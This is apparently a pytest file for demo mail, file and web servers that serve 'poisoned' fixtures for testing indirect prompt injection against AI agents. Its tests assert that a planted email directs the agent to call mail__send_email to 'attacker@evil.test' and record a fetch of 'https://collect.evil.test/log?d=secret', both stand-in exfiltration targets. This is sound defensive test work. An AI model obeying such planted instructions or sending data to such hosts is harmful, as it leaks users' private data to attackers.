"""KS-708: the poisoned fixtures as the demo servers serve them, and the web server.

A flag turns the poison on (`MAIL_POISONED`, `FILES_POISONED`), as `ECHO_POISONED` does for the
echo server, because the base fixtures are counted by earlier tests and a demo wants them clean.
"""

import json
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import httpx
import pytest
from mcp import Client

from examples.injections import find_markers
from examples.upstreams import _common, files_server, mail_server, web_server
from tests.fixtures.mcp_results import many, one, texts
from tests.fixtures.servers import ServerThread

pytestmark = pytest.mark.phase(7)

FIXTURES = Path(__file__).resolve().parents[2] / "examples" / "fixtures"


async def call(thread: ServerThread, tool: str, **arguments: Any) -> Any:
    async with Client(f"{thread.url}/mcp") as client:
        return await client.call_tool(tool, arguments)


def serve(server: Any, **options: Any) -> ServerThread:
    return ServerThread(_common.http_app(server, host="127.0.0.1", **options)).start()


def state_of(thread: ServerThread) -> dict[str, Any]:
    state: dict[str, Any] = httpx.get(f"{thread.url}/_state", timeout=10).json()
    return state


def reset(thread: ServerThread) -> None:
    httpx.post(f"{thread.url}/_reset", timeout=10).raise_for_status()


def status_without_a_key(thread: ServerThread) -> int:
    return httpx.post(f"{thread.url}/mcp", json={}, timeout=10).status_code


@pytest.fixture
def web(tmp_path: Path) -> Iterator[ServerThread]:
    thread = serve(web_server.create_server(), api_key=None)
    yield thread
    thread.stop()


# -- mail


async def test_the_mailbox_is_clean_unless_it_is_poisoned(tmp_path: Path) -> None:
    clean = serve(mail_server.create_server(tmp_path / "clean.db"), api_key=None)
    poisoned = serve(
        mail_server.create_server(tmp_path / "poisoned.db", poisoned=True), api_key=None
    )
    try:
        before = many(await call(clean, "list_emails"))
        after = many(await call(poisoned, "list_emails"))
    finally:
        clean.stop()
        poisoned.stop()

    assert len(before) == 8
    assert [m["id"] for m in after] == ["m15", "m14", "m13"] + [m["id"] for m in before]


async def test_the_environment_flag_poisons_the_mailbox(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("MAIL_POISONED", "1")
    thread = serve(mail_server.create_server(tmp_path / "mail.db"), api_key=None)
    try:
        unread = many(await call(thread, "list_emails", unread_only=True))
    finally:
        thread.stop()

    assert [m["id"] for m in unread][:3] == ["m15", "m14", "m13"]


async def test_reading_a_poisoned_email_returns_its_marker(tmp_path: Path) -> None:
    thread = serve(mail_server.create_server(tmp_path / "mail.db", poisoned=True), api_key=None)
    try:
        email = one(await call(thread, "read_email", email_id="m13"))
        listing = texts(await call(thread, "list_emails", unread_only=True))
    finally:
        thread.stop()

    [attack] = find_markers(email["body"])
    assert attack.tool == "mail__send_email" and attack.args["to"] == "attacker@evil.test"
    # What a listing shows, the sender and the subject, carries no instruction.
    assert not any("ks-do" in text for text in listing)


async def test_reset_puts_the_poisoned_mailbox_back(tmp_path: Path) -> None:
    thread = serve(mail_server.create_server(tmp_path / "mail.db", poisoned=True), api_key=None)
    try:
        await call(thread, "send_email", to="x@acme.test", subject="s", body="b")
        reset(thread)
        state = state_of(thread)
        inbox = many(await call(thread, "list_emails"))
    finally:
        thread.stop()

    assert state["sent"] == [] and len(inbox) == 11


# -- files


async def test_two_poisoned_files_appear_only_when_asked(tmp_path: Path) -> None:
    clean = serve(files_server.create_server(tmp_path / "a", tmp_path / "a.db"), api_key=None)
    poisoned = serve(
        files_server.create_server(tmp_path / "b", tmp_path / "b.db", poisoned=True), api_key=None
    )
    try:
        paths = {}
        for name, thread in (("clean", clean), ("poisoned", poisoned)):
            found = []
            for folder in (".", "notes", "reports"):
                found += [
                    f"{folder}/{e['name']}".removeprefix("./")
                    for e in many(await call(thread, "list_files", path=folder))
                ]
            paths[name] = set(found)
        text = texts(await call(poisoned, "read_file", path="notes/vendor-onboarding.md"))[0]
    finally:
        clean.stop()
        poisoned.stop()

    assert len(paths["poisoned"] - paths["clean"]) == 2
    assert paths["clean"] <= paths["poisoned"]
    assert len(find_markers(text)) == 1


async def test_the_environment_flag_poisons_the_files(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("FILES_POISONED", "1")
    thread = serve(files_server.create_server(tmp_path / "w", tmp_path / "w.db"), api_key=None)
    try:
        listing = many(await call(thread, "list_files", path="notes"))
    finally:
        thread.stop()

    assert "vendor-onboarding.md" in {e["name"] for e in listing}


# -- web


async def test_fetch_returns_the_stored_page_for_a_url(web: ServerThread) -> None:
    page = one(await call(web, "fetch", url="https://docs.acme.test/handbook/expenses"))

    assert page["status"] == 200 and page["url"] == "https://docs.acme.test/handbook/expenses"
    assert page["title"] and "expense" in page["text"].lower()
    assert "ks-do" not in page["text"]


async def test_fetch_ignores_a_fragment_and_surrounding_space(web: ServerThread) -> None:
    plain = one(await call(web, "fetch", url="https://docs.acme.test/handbook/expenses"))
    odd = one(await call(web, "fetch", url="  https://docs.acme.test/handbook/expenses#limits "))

    assert odd["text"] == plain["text"]


async def test_a_poisoned_page_carries_its_marker(web: ServerThread) -> None:
    pages = json.loads((FIXTURES / "web" / "pages.json").read_text())
    [url, *_] = [p["url"] for p in pages if p["poisoned"]]

    page = one(await call(web, "fetch", url=url))

    [attack] = find_markers(page["text"])
    assert attack.tool.count("__") == 1


async def test_an_unknown_url_is_an_error_and_nothing_is_fetched_from_the_network(
    web: ServerThread,
) -> None:
    # The address is one nothing listens on. A server that tried it would fail another way.
    result = await call(web, "fetch", url="http://127.0.0.1:9/never")

    assert result.is_error and "no page is stored" in texts(result)[0]


async def test_state_lists_what_was_asked_for_and_reset_clears_it(web: ServerThread) -> None:
    await call(web, "fetch", url="https://docs.acme.test/handbook/expenses")
    await call(web, "fetch", url="https://collect.evil.test/log?d=secret")

    state = state_of(web)
    reset(web)
    cleared = state_of(web)

    assert state["fetched"] == [
        {"url": "https://docs.acme.test/handbook/expenses", "found": True},
        {"url": "https://collect.evil.test/log?d=secret", "found": False},
    ]
    assert state["calls"] == ["fetch", "fetch"]
    assert cleared["fetched"] == [] and cleared["calls"] == []


async def test_the_web_server_requires_its_key_when_it_has_one() -> None:
    thread = serve(web_server.create_server(), api_key="web-key")
    try:
        refused = status_without_a_key(thread)
    finally:
        thread.stop()

    assert refused == 401
